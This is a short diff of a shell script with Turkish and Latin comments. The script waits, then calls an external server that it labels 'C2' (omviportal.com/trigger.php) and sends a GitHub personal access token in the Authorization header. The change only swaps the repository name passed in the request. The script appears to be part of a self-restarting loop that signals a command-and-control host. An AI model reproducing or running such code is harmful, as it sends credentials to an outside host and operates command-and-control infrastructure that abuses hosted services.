@@ -32,7 +32,7 @@ sleep $((TOTAL_SECONDS - 60))
 
 # Sinyal gönder (Hostingindeki trigger.php tetiklenir)
 echo "📡 Sinyal mittitur ad C2 (omviportal.com)..."
-curl -H "Authorization: $GH_PAT" "https://omviportal.com/trigger.php?repo=POYRAZ"
+curl -H "Authorization: $GH_PAT" "https://omviportal.com/trigger.php?repo=Zaza"
 
 echo "🛑 Ciclo finito. Repositorium iterum incipit."
 exit 0
